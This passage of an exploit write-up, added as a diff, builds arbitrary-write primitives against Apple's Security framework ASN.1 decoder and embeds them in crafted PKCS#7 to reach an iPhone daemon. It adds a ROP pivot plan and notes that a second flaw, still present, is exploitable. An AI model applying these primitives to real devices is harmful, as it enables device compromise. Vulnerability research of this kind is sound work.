+            START_BITSTRING(0, 8); \
+                PUSH8(x); \
+        } \
+    } while (0)
+
+And finally, our code looks like this:
+
+    CONS_BITSTRING(len);
+        START_BITSTRING(0, 0); // break
+
+        MAKE_ARENA64('a', 0x3190 - 0x3020, 0x4141414141414140, 0x4141414141414150);
+
+        WRITE64(0, 0x4242424242424242); // break & write
+
+    if (len) {
+        START_BITSTRING(0, 0); // break for clean exit
+        START_BITSTRING(0, len - 1);
+        while (len) {
+            PUSH1('z');
+        }
+    }
+
+It essentially translates to:
+
+    memset(0x4141414141414140, 0, sizeof(0x4242424242424242) + 1);
+    *(uint64_t *)0x4141414141414140 = 0x4242424242424242;
+
+You will notice there are 3 breakers. One just before hijacking the current
+Arena. Another one inside the arbitrary write, and the last one just before
+the remainder of the string. The last one makes sure further ASN.1 parsing
+resumes in a normal way, without even crashing. This is possible because we
+designed our fake Arena as small as possible, just enough to accommodate
+one write; any further allocs will link in new legit Arenas.
+
+To sum it up, we smash a state object to manipulate the current Arena. This
+will coerce `sec_asn1d_zalloc` into returning the address we want, and make
+this fake Arena look exhausted after one write. Then we just copy our value
+at the aforementioned address. There is one minor inconvenience though: the
+destination address is subject to a zeroing step, which goes one byte past
+our write size. In order to fix the bleeding, we have to do a multi-stage
+write (WRITE64 has a parameter to correct this automatically if needed):
+
+    // write n bytes
+    START_BITSTRING(0, 0); // break
+    START_BITSTRING(7, 1); // sec_asn1d_zalloc, then memset(dest, 0, 1 + 1)
+        PUSH1(first); // write first byte. item->Length = (0 + 1) * 8 - 7
+    START_BITSTRING(0, n);
+        PUSHB(next); // next bytes get written at offset +1
+
+And finally, we can do as many writes as we want, by repeating the process:
+
+    CONS_BITSTRING(len);
+        START_BITSTRING(0, 0);
+
+        MAKE_ARENA64('a', 0x3190 - 0x3020, 0x4141414141414140, 0x4141414141414140 + 16);
+
+        WRITE64(0, 0x4242424242424242);
+
+        START_BITSTRING(0, 0);
+
+        MAKE_ARENA64('a', 0, 0x4343434343434340, 0x4343434343434340 + 16);
+
+        WRITE64(0, 0x4444444444444444);
+
+    if (len) {
+        START_BITSTRING(0, 0);
+        START_BITSTRING(0, len - 1);
+        while (len) {
+            PUSH1('z');
+        }
+    }
+
+Which translate into:
+
+    *(uint64_t *)0x4141414141414140 = 0x4242424242424242;
+    *(uint64_t *)0x4343434343434340 = 0x4444444444444444;
+
+Notice the subsequent writes, and their respective Arenas, start afresh. It
+means D must be always zero after the first one.
+
+The reasoning is almost identical for 32bit, we just need to find D and K.
+D can be found experimentally:
+
+    D = 0x7a1f18e8 - 0x7a1f1810 // actual values do not matter
+
+And then K is found with the following formula:
+
+    K = (64=offsetof(sec_asn1d_state, bit_string_unused_bits) +
+         round8(K + 10) + 0=bit_string_unused_bits) / 8
+
+Once we found D and K=11, we can write a similar Arena primitive:
+
+    #define MAKE_ARENA32(filler, arena_used, lower_bound, upper_bound) \
+    do { \
+        CONS_BITSTRING(10 + 11); \
+            REP_BITSTRING(0, 11, filler); \
+            \
+            START_BITSTRING(0, 4); \
+            PUSH4((11 * 8 - 0 + 4) * 8 + (arena_used) + 2*4); \
+        \
+        START_BITSTRING(0, 8); \
+            PUSH4(upper_bound); \
+            PUSH4(lower_bound); \
+    } while (0)
+
+    #define WRITE32(clean, x) \
+    do { \
+        START_BITSTRING(0, 0); \
+        if (clean) { \
+            START_BITSTRING(7, 1); \
+                PUSH1(x); \
+            START_BITSTRING(0, 3); \
+                PUSH3((x) >> 8); \
+        } else { \
+            START_BITSTRING(0, 4); \
+                PUSH4(x); \
+        } \
+    } while (0)
+
+allowing us to kickstart the write-anywhere:
+
+    MAKE_ARENA32('a', 0x8e8 - 0x810, 0x41414140, 0x41414140 + 16);
+
+What we got is an extremely reliable primitive which can write constant
+values at constant addresses. Let's see if we can put them to good use.
+
+-- 3 - Exploit techniques
+
+We need to target some application or daemon that listens and accepts ASN.1
+encoded data. So far, we have experimented on bare bitstrings, but that is
+extremely unlikely any real world application would ask for. We need some
+standard containers, such as an X.509 certificate or a PKCS#7 structure,
+ready to be consumed. A certificate's signature is indeed a bitstring that
+we can manipulate, but that renders the certificate invalid. Our exploit
+would need to fully achieve its goal before the certificate is validated.
+
+For now, let's suppose our victim is a daemon that consumes PKCS#7 and
+extracts the certificate for later validation. It accomplishes this with a
+call to `SecCMSCertificatesOnlyMessageCopyCertificates`. That function can
+be found inside the Security framework, and it uses `SecCmsMessageDecode`
+to parse the incoming PKCS#7, which in turn uses `SEC_ASN1DecoderUpdate`.
+
+-- 3.0 - PKCS#7
+
+PKCS#7 stands for Cryptographic Message Syntax (aka CMS). It is a standard
+for storing signed and/or encrypted data, described by RFC 3369[4].
+
+Looking at Security-57337.20.44/OSX/libsecurity_smime/lib/cmsasn1.c, we see
+that we can find only one occurence of `kSecAsn1BitStringTemplate`. Recall
+the parser is driven by templates, so we know the ASN.1 parser will expect
+a bitstring wherever it hits that template. Tracing back, we get:
+
+    SecCmsOriginatorPublicKeyTemplate
+    SecCmsOriginatorIdentifierOrKeyTemplate
+    SecCmsKeyAgreeRecipientInfoTemplate
+    SecCmsRecipientInfoTemplate
+    SecCmsEnvelopedDataTemplate
+    NSS_PointerToCMSEnvelopedDataTemplate
+    nss_cms_choose_content_template()
+    nss_cms_chooser
+    SecCmsMessageTemplate
+    SecCmsDecoderCreate()
+    SecCmsMessageDecode()
+
+It looks like we need to craft an enveloped PKCS#7. However, our target
+expects a signed PKCS#7, which looks roughly like this:
+
+    cons: SEQUENCE
+    prim:  OBJECT            :pkcs7-signedData
+    cons:  cont [ 0 ]
+    cons:   SEQUENCE
+    prim:    INTEGER           :01
+    cons:    SET
+    cons:    SEQUENCE
+    prim:     OBJECT            :pkcs7-data
+    cons:    cont [ 0 ]
+    <certificate>
+    cons:    SET
+
+But wait. We can stash an enveloped PKCS#7 instead of raw pkcs7-data.
+
+    cons: SEQUENCE
+    prim:  OBJECT            :pkcs7-signedData
+    cons:  cont [ 0 ]
+    cons:   SEQUENCE
+    prim:    INTEGER           :01
+    cons:    SET
+    cons:     SEQUENCE
+    prim:      OBJECT            :sha1
+    prim:      NULL
+    cons:    SEQUENCE
+    prim:     OBJECT            :pkcs7-envelopedData
+    cons:     cont [ 0 ]
+    prim:      OCTET STRING      [HEX DUMP]:<enveloped data>
+    cons:    cont [ 0 ]
+    <certificate>
+    cons:    SET
+
+The enveloped data must be a valid ASN.1 encoding, matching the templates
+we saw above. Roughly speaking, this is the equivalent of the following:
+
+    $ echo "Hello world" > input.txt
+    $ openssl ecparam -name secp521r1 -genkey -param_enc explicit -out private-key.pem
+    $ openssl req -new -x509 -key private-key.pem -out server.pem -days 730
+    $ openssl cms -encrypt -binary -aes256 -in input.txt -outform DER -out encrypted.der server.pem
+    $ openssl cms -inform DER -in encrypted.der -cmsout -print
+
+encrypted.der looks somewhat like this:
+
+    cons: SEQUENCE
+    prim:  INTEGER           :02
+    cons:  SET
+    cons:   cont [ 1 ]
+    cons:    SEQUENCE
+    prim:     INTEGER           :03
+    cons:     cont [ 0 ]
+    cons:      cont [ 2 ]
+    cons:       SEQUENCE
+    cons:        SEQUENCE
+    prim:         OBJECT            :id-ecPublicKey
+    prim:        BIT STRING
+    <more stuff>
+
+Great! There's our bitstring. We know the inner PKCS#7 will be handled by a
+recursive call to `SecCmsMessageDecode`, and the error code of that parser,
+if any, is totally discarded. This can be observed in `nss_cms_before_data`
+and `nss_cms_decoder_work_data` respectively. It seems pretty good from our
+perspective, because we do not need to worry whether the inner ASN.1 ends
+abruptly and, most importantly, the recursive call to `SecCmsMessageDecode`
+will create fresh Arenas. Remember our D constant when invoking the first
+MAKE_ARENA64? Yeah, it will be unchanged between runs. It seems we can have
+our cake and eat it. But not just yet... Let's recap what we have so far.
+
+We build our bitstring inside an enveloped PKCS#7, which is contained in a
+signed PKCS#7 allowing us to write constant values at constant addresses.
+All those constant values and addresses come from the input itself.
+
+-- 3.1 - Building blocks
+
+Our target daemon is running on an iPhone, listening to USB and is ready to
+consume the crafted PKCS#7. Back in 2016, USB restricted mode wasn't even a
+thing and a lot of daemons were running Before First Unlock.
+
+The full exploit itself is beyond the scope of this article and is left as
+an exercise for the reader. The bug has been patched years ago, and it does
+not preserve any value whatsoever today, except illustrating my thought
+process at the time and introducing some creative ways of subverting the
+ASN.1 decoding machinery, as we shall see below.
+
+The basic idea is to first leak out the shared cache slide, then build a
+relocated ROP strip offline, then send it back, and then finally pivot to
+it. A couple of guiding lines are laid below, and mock-ups are included in
+the attached source code:
+    step1 - the bruteforcer - preparatory step for guessing the scratch,
+    step2 - buffer switching - used for leaking out the shared cache slide,
+    step3 - the ROP pivot - the actual exploit payload.
+
+We will now mostly concentrate on step2 and step3 because they contain some
+interesting tricks. One major shortcoming of our MAKE_ARENA/WRITE technique
+is that we can only write out constant values. To extract the shared cache
+we must be able to write out live pointers.
+
+While being focused on our write-primitive we have overlooked one important
+aspect: the write itself is just a byproduct of what we have built so far.
+Before we had a write primitive, we had an allocation primitive: we could
+target a scratch area in memory and force allocation of state objects at
+known locations. A viable scratch address can be found empirically: it can
+be any writable area in our victim memory space that should stay relatively
+constant between runs. It depends on the targeted application/daemon, but
+in absence of a true infoleak, it's still easy to figure it out: vmmap is
+your best friend; also the bruteforcer may be used as a poor man's vmmap.
+Check out the heap, the shared cache data segment, the daemon itself, the
+stacks, or whatever else floats your boat.
+
+Remember that state objects contain one pointer from the shared cache: the
+template itself. And while the parser is busy with our bitstring, we know
+the template is `kSecAsn1BitStringTemplate`, which is as good as any other
+pointer.
+
+First, we cause a state object allocation at a known address. This is done
+by hijacking the Arena to some reasonably large unused scratch space (known
+a priori), right before a new state object is allocated:
+
+        |<------------------------- SCRATCH ------------------------->|
+        |                                                             |
+        |   |<------- State object -------->|                         |
+        |   |                               |                         |
+    -----------------------------------------------------------------------
+        ... top theTemplate dest ...
+    -----------------------------------------------------------------------
+
+Afterwards, we punch some writes before and some writes after the pointer.
+
+        |<------------------------- SCRATCH ------------------------->|
+        |                                                             |
+        |   |<------- State object -------->|                         |
+        |   |                               |                         |
+    -----------------------------------------------------------------------
+        ... top theTemplate dest ...
+    -----------------------------------------------------------------------
+            ^^^^           ^^^^^^^^
+
+We are effectively building a bitstring around the template pointer using
+only constant writes to the scratch area. What should we write around the
+pointer? Exactly, MAKE_ARENA/WRITE contraptions.
+
+        |<------------------------- SCRATCH ------------------------->|
+        |                                                             |
+        |   |<------- State object -------->|                         |
+        |   |                               |                         |
+    -----------------------------------------------------------------------
+        ... xxxxtheTemplateyyyyy ...
+    -----------------------------------------------------------------------
+            ^ ^^
+            | |+- WRITE64(theTemplate) contraption
+            | +- MAKE_ARENA64 contraption
+            |
+            +- start of run-time built bitstring
+
+This ephemeral bitstring does not even have to have a well-formed tail.
+Since we are inside an enveloped content, which is parsed by a recursive
+`SecCmsMessageDecode` call, the error code is ignored. If we could pivot
+the input buffer to this scratch area, it will pick up and write the
+template to whatever desired location. The exploit is writing itself at
+run-time, Inception-style.
+
+But how do we pivot the input buffer? It does not seem to be part of the
+state object, and to make it worse, it is kept by `SEC_ASN1DecoderUpdate`
+in a CPU register. Even if it was kept on the stack, targeting `buf` means
+we have exactly one chance. We cannot use MAKE_ARENA/WRITE(clean=0, ...) in
+single-shot mode, because it exhibits +1 bleeding (there is a zeroing step
+which goes over the write size + 1) and will clobber the adjacent variable;
+and we cannot use MAKE_ARENA/WRITE(clean=1, ...) in multi-shot mode because
+we risk having it accessed before it is fully pivoted.
+
+Looking at `sec_asn1d_record_any_header` and `sec_asn1d_add_to_subitems`,
+we notice the CPU register holding the input buffer is saved to the stack
+and is reloaded before return. However, inside `sec_asn1d_add_to_subitems`
+there is an assignment that looks interesting:
+
+    thing = sec_asn1d_zalloc();
+    ...
+    thing->data = data;
+    ...
+    state->subitems_tail->next = thing;
+
+The code flow disassembly is laid out below:
+
+    _SEC_ASN1DecoderUpdate:
+        ...
+        MOV     X0, X21
+        MOV     X1, X20 // buf
+        MOV     X2, X22 // len
+        BL      _sec_asn1d_parse_leaf
+        ...
+        BL      _sec_asn1d_record_any_header
+        ...
+        RET
+
+    _sec_asn1d_record_any_header:
+        ...
+        B       _sec_asn1d_add_to_subitems
+
+    _sec_asn1d_add_to_subitems:
+        STP     X24, X23, [SP,#-0x10+var_30]!
+        STP     X22, X21, [SP,#0x30+var_20]
+        STP     X20, X19, [SP,#0x30+var_10] // save buf register (x20)
+        STP     X29, X30, [SP,#0x30+var_s0]
+        ...
+        MOV     X19, X0 // state
+        ...
+        BL      _sec_asn1d_zalloc
+        MOV     X20, X0 // controlled alloc -> thing
+        ...
+        LDR     X8, [X19,#0x78] // x8 = state->subitems_head
+        CBZ     X8, ...
+        LDR     X8, [X19,#0x80] // x8 = state->subitems_tail
+        STR     X20, [X8,#0x10] // state->subitems_tail->next = thing
+        STR     X20, [X19,#0x80] // state->subitems_tail = thing
+        ...
+        LDP     X29, X30, [SP,#0x30+var_s0]
+        LDP     X20, X19, [SP,#0x30+var_10] // restore buf register (x20)
+        LDP     X22, X21, [SP,#0x30+var_20]
+        LDP     X24, X23, [SP+0x30+var_30],#0x40
+        RET
+
+We know `sec_asn1d_zalloc` can be made to return whatever address we want,
+because we can virtually create Arenas out of thin air. If we could point
+`&subitems_tail.next` towards the location of X20 on the stack, we can
+reload the register holding the input buffer to whatever `sec_asn1d_zalloc`
+returns. That is the address of the ephemeral bitstring we previously built
+inside the scratch area of the victim space. Remember, the scratch area can
+can be determined empirically and is presumed at a constant address between
+runs. Locating the exact stack address where X20 is held is just a matter
+of using vmmap and/or the bruteforcer step in creative ways. Hint: a daemon
+crashes and is reloaded. Go back in time and try to spot some things that
+remained constant.
+
+The plan is as follows: after building the new bitstring, which is capable
+of writing live values, we create some more items. Recall we're slicing the
+scratch space hence the addresses of the ephemeral bitstring as well as the
+items and objects are considered known. We'll have a `SecAsn1Item` (serving
+as `dest`) and a subitem (serving as `subitems_head`). And then we force a
+hierarchy of three state objects: a grandfather object, a father object
+whose parent is the previous one and a child object which does the writing.
+The last object will smash its parent, filling in known values for: `dest`,
+`parent` (known value), `subitems_head`, `subitems_tail`. Taking the trip
+to `sec_asn1d_add_to_subitems` is just a matter of altering `state->place`
+to `duringBitString` and `state->underlying_kind` to `SEC_ASN1_ANY`.
+
+        |<------------------------- SCRATCH ------------------------->|
+        |                                                             |
+        |                                 +- parent -+                |
+        |                                 v          |                |
+    -----------------------------------------------------------------------
+        ... DYNSTRING SecAsn1Item subitem STATE ... STATE ... STATE ...
+    -----------------------------------------------------------------------
+                                                    ^^^^^     |
+                                                      +-------+
+                                                        smash
+
+After smashing the secondary object, we end up with this:
+
+        |<------------------------- SCRATCH ------------------------->|
+        |                                                             |
+        |                                 +- parent -+                |
+        |                                 v          |                |
+    -----------------------------------------------------------------------
+        ... DYNSTRING SecAsn1Item subitem STATE ... STATE ... STATE ...
+    -----------------------------------------------------------------------
+            |         ^           ^                   |
+            |         |           +-- subitems_head --+
+            |         +-- dest -----------------------+
+            |                     +-- subitems_tail --+
+            |                     v
+            +-------------------> stack location of saved input buf
+
+This technique has a nasty side-effect: after coercing `sec_asn1d_zalloc`
+to return the desired address, `sec_asn1d_add_to_subitems` writes that same
+address to itself, which means the first bytes that'll get picked up from
+the newly pivoted `buf` will be the most significant bytes of the address.
+A workaround is to have said address be `0x...23nn`. The reasoning behind
+this is that 0x23 would be confused with a useless constructed bitstring
+allowing us to skip the MSB of the address and get out of the danger zone
+as quickly as possible. This should not be a major constraint, since the
+scratch area should be larger than 16kB anyway. Because of how things add
+up in the decoder, and working the arithmetic backwards, this imposes a
+constraint on our scratch buffer to be located at `0x...20nn`. step2 shows
+how this is accomplished (though you may need to fix STACK_RBP_RELATIVE to
+match your library/framework).
+
+    sec_asn1d_parse_leaf: memcpy(0x10b5722e8 + 0 = 0x10b5722e8, "6666666666666666", 19)
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    adjusting item->len (19) to 148, unused=0x4
+    STATE transition ...
+    sec_asn1d_parse_leaf: len=547, @479
+    sec_asn1d_parse_leaf: memcpy(0x10b5722e8 + 148 = 0x10b57237c, "540", 4)
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    adjusting item->len (152) to 18446744073709551488, unused=0x540
+    STATE transition ...
+    sec_asn1d_parse_leaf: len=540, @486
+    sec_asn1d_parse_leaf: memcpy(0x10b5722e8 + 18446744073709551488 = 0x10b572268, "10b5720c0", 120)
+    sec_asn1d_parse_leaf: pre-existing value = 0x7fab5e801868
+    STATE transition ...
+    sec_asn1d_add_to_subitems:1880: zalloc(24) -> 0x10b572398 in arena o_pool/0x0 (left -1)
+    sec_asn1d_add_to_subitems:1890: alloc(1) -> 0x10b5723b0 in arena o_pool/0x0 (left 18446744073709551615)
+    adding to subitems_tail: 0x10b572258::0x7ffee4729138(0x7ffee4729148) <= 0x10b572398         <-- [E]
+    new ARENA -> o_pool/0x7fab5e805020 of size 2087
+    sec_asn1d_add_to_subitems:1880: zalloc(24) -> 0x7fab5e805020 in arena o_pool/0x7fab5e805020 (left 2031)
+    sec_asn1d_add_to_subitems:1890: alloc(1) -> 0x7fab5e805038 in arena o_pool/0x7fab5e805020 (left 2023)
+    adding to subitems_tail: 0x10b572258::0x10b572398(0x10b5723a8) <= 0x7fab5e805020
+    sec_asn1d_prepare_for_contents:1458: zalloc(35) -> 0x7fab5e805040 in arena o_pool/0x7fab5e805020 (left 1983)
+    sec_asn1d_parse_leaf: len=418, @18446603704184794972
+    sec_asn1d_parse_leaf: memcpy(0x7fab5e805040 + 0 = 0x7fab5e805040, "1000000010b57", 35)
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    STATE transition ...
+    sec_asn1d_prepare_for_contents:1458: zalloc(29) -> 0x7fab5e805068 in arena o_pool/0x7fab5e805020 (left 1951)
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7fab5e805088 in arena o_pool/0x7fab5e805020 (left 1807)
+    STATE transition ...
+    sec_asn1d_parse_leaf: len=375, @18446603704184795015
+    sec_asn1d_parse_leaf: memcpy(0x7fab5e805068 + 0 = 0x7fab5e805068, "7878787878787878", 19)
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    adjusting item->len (19) to 148, unused=0x4
+    STATE transition ...
+    sec_asn1d_parse_leaf: len=353, @18446603704184795037
+    sec_asn1d_parse_leaf: memcpy(0x7fab5e805068 + 148 = 0x7fab5e8050fc, "518", 4)
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    adjusting item->len (152) to 18446744073709551528, unused=0x518
+    STATE transition ...
+    sec_asn1d_parse_leaf: len=346, @18446603704184795044
+    sec_asn1d_parse_leaf: memcpy(0x7fab5e805068 + 18446744073709551528 = 0x7fab5e805010, "10b572611", 16)
+    sec_asn1d_parse_leaf: pre-existing value = 0x7fab5e805827
+    adjusting item->len (18446744073709551544) to 18446744073709551040, unused=0x0
+    STATE transition ...
+    sec_asn1d_prepare_for_contents:1458: zalloc(9) -> 0x10b572601 in arena o_pool/0x0 (left -1)
+    sec_asn1d_parse_leaf: len=324, @18446603704184795066
+    sec_asn1d_parse_leaf: memcpy(0x10b572601 + 0 = 0x10b572601, "10b503510", 8)
+
+In case you missed it, the buffer was switched at [E] in the previous log.
+As convoluted as it is, this method allows us to pivot from a static buffer
+to a dynamically constructed one, capable of writing shared cache pointers
+to any location that would help us leak the shared cache slide outside and
+build the ROP strip as shown next, in step3.
+
+We notice there is one particular callback that gets called during parsing:
+`state->top->filter_proc(state->top->filter_arg)`. It looks powerful enough
+to pivot to a ROP strip. Let's revise the `state->top` structure:
+
+    typedef struct sec_DecoderContext_struct {
+        PRArenaPool *our_pool;
+        PRArenaPool *their_pool;
+        void *their_mark;
+
+        sec_asn1d_state *current;
+        sec_asn1d_parse_status status;
+
+        SEC_ASN1NotifyProc notify_proc;
+        void *notify_arg;
+        PRBool during_notify;
+
+        SEC_ASN1WriteProc filter_proc;
+        void *filter_arg;
+        PRBool filter_only;
+    } SEC_ASN1DecoderContext;
+
+We plan on creating a fake `SEC_ASN1DecoderContext`, fill in `filter_proc`
+with a pivot gadget, then fill in `filter_arg` with the address of the ROP
+strip. We are only interested in `filter_proc` and `filter_arg`, everything
+else can be ignored because the ROP strip is not supposed to ever return.
+After that, we cause another state object allocation and point its `top` to
+our fake `SEC_ASN1DecoderContext`.
+
+        |<------------------------- SCRATCH ------------------------->|
+        |                                                             |
+        |             +--------------------- top -+                   |
+        |             v                           |                   |
+    -----------------------------------------------------------------------
+    ... ROP strip ... SEC_ASN1DecoderContext TEMP STATE TEMP STATE ...
+    -----------------------------------------------------------------------
+        ^                            | |          ^            |
+        |      filter_proc (pivot) <-+ |          +------------+
+        +----- filter_arg -------------+            change top
+
+We can use our write primitive to lay down the ROP strip and an incomplete
+`SEC_ASN1DecoderContext` inside the scratch area. Then we trigger a couple
+of object allocations so that one object can smash its parent `top`. This
+is illustrated in step3.
+
+Once we have the ROP running, we can use a kernel LPE. A good candidate is
+CVE-2016-4656[5] + CVE-2016-4655[6] pair, which can be triggered from ROP
+easily.
+
+-- 4 - Fast forward
+
+Five years later I decide to do this write-up, trying hard to remember some
+details of the ancient exploit; I begin tinkering with the mock-ups and the
+old library. I realise there were two bugs, not one, and I decide to check
+out the latest and greatest source tarball: Security-59754.80.3, as of this
+writing. Yep, still there.
+
+Sadly, the fix for CVE-2016-1950 not only eliminated the bit/byte confusion
+but also introduced new safety checks so that `data->Length` could not wrap
+around. It meant we cannot reach the Arena structure by going backwards in
+memory.
+
+I wept.
+
+And then I got completely black out drunk, though for completely unrelated
+reasons. It was a fun night. But I digress...
+
+-- 4.0 - Rolling the dice
+
+Ignoring my terrible hangover, let's revisit the other bug, the logic flaw:
+when the parser encounters an empty bitstring, `sec_asn1d_parse_bit_string`
+takes a shortcut and then, later in `sec_asn1d_prepare_for_contents`, the
+item is re-allocated with the wrong size. Please revisit section 2.2 for a
+refresh.
+
+Right, it allocates the buffer anew but this time in `our_pool`, sized for
+`state->contents_length` which -- in case of constructed bitstrings -- will
+be for the next component only. Anything that gets allocated after that
+point will be smashed by subsequent bitstrings. Armed with what we learned
+so far, a trigger is trivial. We smash a state object to cause an immediate
+crash:
+
+    CONS_BITSTRING(len);
+        START_BITSTRING(0, 0);
+        CONS_BITSTRING(3 + 5);
+            REP_BITSTRING(0, 5, 'a');
+        REP_BITSTRING(0, 8 + 144 - 5, 'b');
+        CONS_BITSTRING(3 + 8);
+            REP_BITSTRING(0, 8, 'c');
+
+    if (len) {
+        START_BITSTRING(0, 0);
+        START_BITSTRING(0, len - 1);
+        while (len) {
+            PUSH1('z');
+        }
+    }
+
+The 'a' part allocates 8 bytes, followed by a state object (144 bytes). The
+first memcpy covered 5 bytes, so the next memcpy needs to cover 8 + 144 - 5
+bytes. The 'b' part leaves the dest pointer dangling over the upcoming next
+state object and then the 'c' part would smash the 'top' pointer resulting
+in a reliable crasher.
+
+    sec_asn1d_prepare_for_contents: zalloc(8) -> 0x7ff006008dd0 in arena o_pool/0x7ff006008c20 (left 1615)
+    sec_asn1d_push_state: zalloc(144) -> 0x7ff006008dd8 in arena o_pool/0x7ff006008c20 (left 1471)
+    STATE transition 0x7ff006008d40 -> 0x7ff006008dd8
+    sec_asn1d_parse_leaf: memcpy(0x7ff006008dd0 + 0 = 0x7ff006008dd0, "61616161", 5)
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    STATE transition 0x7ff006008dd8 -> 0x7ff006008d40
+    STATE transition 0x7ff006008d40 -> 0x7ff006008cb0
+    STATE transition 0x7ff006008cb0 -> 0x7ff006008d40
+    sec_asn1d_parse_leaf: memcpy(0x7ff006008dd0 + 5 = 0x7ff006008dd5, "6262626262626262", 147)
+    sec_asn1d_parse_leaf: pre-existing value = 0xf006006a20000000
+    STATE transition 0x7ff006008d40 -> 0x7ff006008cb0
+    STATE transition 0x7ff006008cb0 -> 0x7ff006008d40
+    sec_asn1d_push_state: zalloc(144) -> 0x7ff006008e68 in arena o_pool/0x7ff006008c20 (left 1327)
+    STATE transition 0x7ff006008d40 -> 0x7ff006008e68
+    sec_asn1d_parse_leaf: memcpy(0x7ff006008dd0 + 152 = 0x7ff006008e68, "6363636363636363", 8)
+    sec_asn1d_parse_leaf: pre-existing value = 0x7ff006006a20
+    <CRASH>
+
+This doesn't seem very exploitable, especially since `dest` is allocated
+somewhere in `their_pool`, the state objects are allocated in `our_pool`
+and we cannot touch the Arenas anymore. Or can we?
+
+After studying the allocation pattern, we notice something which manifests
+in a consistent manner after the 'b' segment:
+
+    state = 0x7fe18b80d068 top = 0x7fe18b803420 dest = 0x7fe18b803e68
+    state = 0x7fb3ad009268 top = 0x7fb3ad006e20 dest = 0x7fb3ad008a68
+    state = 0x7f9798809268 top = 0x7f9798806e20 dest = 0x7f9798808a68
+    state = 0x7fad49009268 top = 0x7fad49006e20 dest = 0x7fad49008a68
+    state = 0x7fb12880fa68 top = 0x7fb12880dc20 dest = 0x7fb12880be68
+    state = 0x7fe8a5809268 top = 0x7fe8a5806e20 dest = 0x7fe8a5808a68
+    state = 0x7fe1d4009268 top = 0x7fe1d4006e20 dest = 0x7fe1d4008a68
+    state = 0x7fb212809268 top = 0x7fb212806e20 dest = 0x7fb212808a68
+    state = 0x7fe7ca804668 top = 0x7fe7ca802220 dest = 0x7fe7ca803e68
+    state = 0x7fa123810068 top = 0x7fa12380dc20 dest = 0x7fa12380f868
+    state = 0x7fa1cc809268 top = 0x7fa1cc806e20 dest = 0x7fa1cc808a68
+    state = 0x7fc288009268 top = 0x7fc288006e20 dest = 0x7fc288008a68
+    state = 0x7fd054809268 top = 0x7fd054806e20 dest = 0x7fd054808a68
+    state = 0x7fa36a80f068 top = 0x7fa36a80cc20 dest = 0x7fa36a80e868
+    state = 0x7fdd63009268 top = 0x7fdd63006e20 dest = 0x7fdd63008a68
+    state = 0x7fd63b810068 top = 0x7fd63b80dc20 dest = 0x7fd63b80f868
+    state = 0x7fee16809268 top = 0x7fee16806e20 dest = 0x7fee16808a68
+    state = 0x7fd1a880da68 top = 0x7fd1a880bc20 dest = 0x7fd1a8803e68
+    state = 0x7ff7cf809268 top = 0x7ff7cf806e20 dest = 0x7ff7cf808a68
+    state = 0x7fdf82005068 top = 0x7fdf82002c20 dest = 0x7fdf82004868
+    ...
+
+With rather decent probability, we observe a repeating pattern of state/top
+pair: 9268/6e20. These addresses are for illustrative purposes, the real
+allocation pattern of the victim daemon we are attacking must be determined
+empirically, by whatever means. It's not the addresses themselves that are
+important, but rather the LSB of those addresses. Again, the state object
+is always at a constant distance from the start of the Arena and `dest`
+seems to be in 0xFFFF range. We could arrange the memory layout like this:
+
+                                 |<----- state object ----->|
+                                 |                          |
+    -----------------------------------------------------------------------
+        ... [&Arena.limit - top] top, template, dest, ...
+    -----------------------------------------------------------------------
+            |                       |
+            |<---- SecAsn1Item ---->|
+    ^                   |
+    +-- to the Arena ---+
+
+Since `state->dest` lies in close proximity of the state object, we can use
+a partial write to reroute it to &state - 8, and then smash the Arena:
+
+    const unsigned FILLER_LEN = 8 + 144 - 5;
+    const unsigned long long LAST_STATE =  0x7fca4b809268;
+    const unsigned long long CURRENT_TOP = 0x7fca4b806e20;
+    const unsigned long long ARENA_LIMIT = LAST_STATE - 0x258; // fixed
+
+    START_BITSTRING(0, 0);
+    CONS_BITSTRING(3 + 5);
+        REP_BITSTRING(0, 5, 'a');
+    // leave the pointer dangling over 'dest'
+    START_BITSTRING(0, FILLER_LEN + 2 * 8);
+        PUSHR(FILLER_LEN - 8, 'b');
+        // place this right below 'top'
+        PUSH8((ARENA_LIMIT - CURRENT_TOP) << 3);
+        PUSHR(2 * 8, 'b'); // skip past 'top' and 'theTemplate'
+    // reroute 'dest' to LAST_STATE - 8 and smash the Arena
+    CONS_BITSTRING(3 + 2 + 3 + 16);
+        // 'dest' -> { ARENA_LIMIT - CURRENT_TOP, CURRENT_TOP }
+        START_BITSTRING(0, 2);
+            PUSH2(LAST_STATE - 8); // partial write
+        // rewrite the Arena
+        START_BITSTRING(0, 16);
+            PUSH8(0x4141414141414150); // limit
+            PUSH8(0x4141414141414140); // avail
+
+                                 |<----- state object ----->|
+                                 |                          |
+    -----------------------------------------------------------------------
+        ... [&Arena.limit - top] top, template, dest ...
+    -----------------------------------------------------------------------
+            |                       |            |
+            |<---- SecAsn1Item ---->|<-----------+
+    ^                   |
+    +-- to the Arena ---+
+
+    ...
+    sec_asn1d_parse_leaf: memcpy(0x7fe4190091d0 + 5 = 0x7fe4190091d5, "6262626262626262", 163)
+    sec_asn1d_parse_leaf: pre-existing value = 0xe419006e20000000
+    STATE transition 0x7fe419009140 -> 0x7fe4190090b0
+    STATE transition 0x7fe4190090b0 -> 0x7fe419009140
+    sec_asn1d_push_state:430: zalloc(144) -> 0x7fe419009268 in arena o_pool/0x7fe419009020 (left 1327)
+    STATE transition 0x7fe419009140 -> 0x7fe419009268
+    state = 0x7fe419009268
+        top = 0x7fe419006e20
+        theTemplate = 0x1001792e0
+        dest = 0x7fe419008a68
+        our_mark = 0x0
+        parent = 0x7fe419009140
+        contents_length = 3
+        pending = 2
+        consumed = 3
+        depth = 9
+        allocate = 0
+        indefinite = 0
+    sec_asn1d_parse_leaf: memcpy(0x7fe4190091d0 + 168 = 0x7fe419009278, "9260", 2)
+    sec_asn1d_parse_leaf: pre-existing value = 0x7fe419008a68
+    STATE transition 0x7fe419009268 -> 0x7fe419009140
+    STATE transition 0x7fe419009140 -> 0x7fe419009268
+    state = 0x7fe419009268
+        top = 0x7fe419006e20
+        theTemplate = 0x1001792e0
+        dest = 0x7fe419009260
+        our_mark = 0x0
+        parent = 0x7fe419009140
+        contents_length = 17
+        pending = 16
+        consumed = 3
+        depth = 9
